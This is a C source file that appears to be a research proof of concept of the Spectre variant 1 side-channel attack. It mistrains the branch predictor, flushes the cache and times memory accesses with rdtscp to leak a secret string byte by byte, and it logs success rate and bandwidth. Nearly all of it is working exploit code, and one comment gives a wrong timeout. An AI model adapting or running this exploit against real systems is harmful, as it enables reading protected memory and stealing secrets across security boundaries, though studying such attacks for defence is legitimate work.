#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <pthread.h>
#include <time.h>
#include <unistd.h>

#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#define BOOL int
#define TRUE 1
#define FALSE 0

pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER; // Mutex lock for thread safety

volatile sig_atomic_t done = 0; // Atomic flag to indicate completion
clock_t start_time, end_time;

unsigned int array1_size = 16; // Size of array1
uint8_t unused1[64]; // Padding to avoid cache effects
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}; // Array with data
uint8_t unused2[64]; // More padding
uint8_t array2[256 * 512]; // Large array for cache timing

char* secret = "Welcome come to China."; // Secret string to extract

uint8_t temp = 0; // Temporary variable

int success_count = 0; // Counter for successful extractions
int unclear_count = 0; // Counter for unclear extractions

void victim_function(size_t x)
{
    if (x < array1_size)
    {
        temp &= array2[array1[x] * 512]; // Simulates memory access pattern
    }
}

#define CACHE_HIT_THRESHOLD (80) // Cache hit threshold for timing attack

// Fisher-Yates shuffle function
void fisher_yates_shuffle(int *array, int n)
{
    for (int i = n - 1; i > 0; i--)
    {
        int j = rand() % (i + 1); // Randomly shuffle array
        int temp = array[i];
        array[i] = array[j];
        array[j] = temp;
    }
}

void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
    static int results[256]; // Array to store timing results
    int tries, i, j, k, mix_i;
    unsigned int junk = 0; // Placeholder variable
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t* addr;

    for (i = 0; i < 256; i++)
        results[i] = 0; // Initialize results array

    int indices[256];
    for (i = 0; i < 256; i++)
        indices[i] = i; // Initialize index array for shuffling

    for (tries = 999; tries > 0; tries--)
    {
        /* (1) Flushing cache lines */
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[indices[i] * 512]); // Flush cache lines of array2 in shuffled order

        /* (2) Mistraining branch predictor */
        training_x = tries % array1_size; // Choose training index

        for (j = 29; j >= 0; j--)
        {
            _mm_clflush(&array1_size); // Flush array1_size from cache

            x = (j % 6) ? training_x : malicious_x; // Alternate between training and attack

            victim_function(x); // Perform memory access based on index

            // Shuffle the index array within the loop
            fisher_yates_shuffle(indices, 256);
        }

        /* (3) Attempting to infer the secret byte that is loaded into the cache */
        for (i = 0; i < 256; i++)
        {
            mix_i = indices[i];
            addr = &array2[mix_i * 512]; // Calculate address to access

            time1 = __rdtscp(&junk); // Start timing
            junk = *addr; // Access memory address
            time2 = __rdtscp(&junk) - time1; // Calculate access time

            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
                results[mix_i]++; // Count cache hits for each byte value
        }

        /* Locate highest & second-highest results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++)
        {
            if (j < 0 || results[i] >= results[j])
            {
                k = j;
                j = i;
            }
            else if (k < 0 || results[i] >= results[k])
            {
                k = i;
            }
        }

        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break; // Exit loop if a clear winner is found
    }

    results[0] ^= junk; // Prevent compiler optimizations
    value[0] = (uint8_t)j; // Store best guess for byte value
    score[0] = results[j]; // Store score for best guess
    value[1] = (uint8_t)k; // Store second best guess
    score[1] = results[k]; // Store score for second best guess
}

void calculate_success_rate_and_exit() {
    double success_rate = (double)success_count / (success_count + unclear_count); // Calculate success rate
    double bandwidth = (double)success_count / 600; // Estimate bandwidth

    FILE *fp;

    fp = fopen("success_rate.txt", "a"); // Open file to append results
    if (fp == NULL) {
        printf("Error opening file!\n");
        exit(1);
    }

    fprintf(fp, "Success rate: %.2f%%\n", success_rate * 100); // Write success rate to file
    fprintf(fp, "bandwidth: %.2f\n", bandwidth); // Write bandwidth to file
    fclose(fp); // Close file

    exit(0); // Exit program
}

void signal_handler(int signum) {
    done = 1; // Set flag to stop execution
    calculate_success_rate_and_exit(); // Calculate success rate and exit
}

int main(int argc, const char* * argv)
{
    signal(SIGALRM, signal_handler); // Register signal handler for alarm signal
    alarm(600); // Set an alarm to stop the program after 180 seconds
    signal(SIGINT, signal_handler); // Register signal handler for interrupt signal

    srand(time(NULL)); // Initialize random seed

    while (!done) {
        size_t malicious_x = (size_t)(secret - (char *)array1); // Calculate offset of secret in array1

        int score[2], len = strlen(secret); // Initialize score array and length of secret
        uint8_t value[2]; // Array to store extracted byte values
        size_t i;

        for (i = 0; i < sizeof(array2); i++)
            array2[i] = 1; // Initialize array2 to avoid copy-on-write zero pages

        if (argc == 3)
        {
            sscanf(argv[1], "%p", (void * *)(&malicious_x)); // Get malicious offset from command line
            malicious_x -= (size_t)array1; // Adjust offset relative to array1
            sscanf(argv[2], "%d", &len); // Get length from command line
        }

        // Loop to extract each byte of the secret
        while (--len >= 0)
        {
            readMemoryByte(malicious_x++, value, score); // Extract byte at current offset

            if (score[0] >= 2 * score[1]) {
                success_count++; // Count as successful extraction
            } else {
                unclear_count++; // Count as unclear extraction
            }
        }
    }

    return 0; // Return success
}
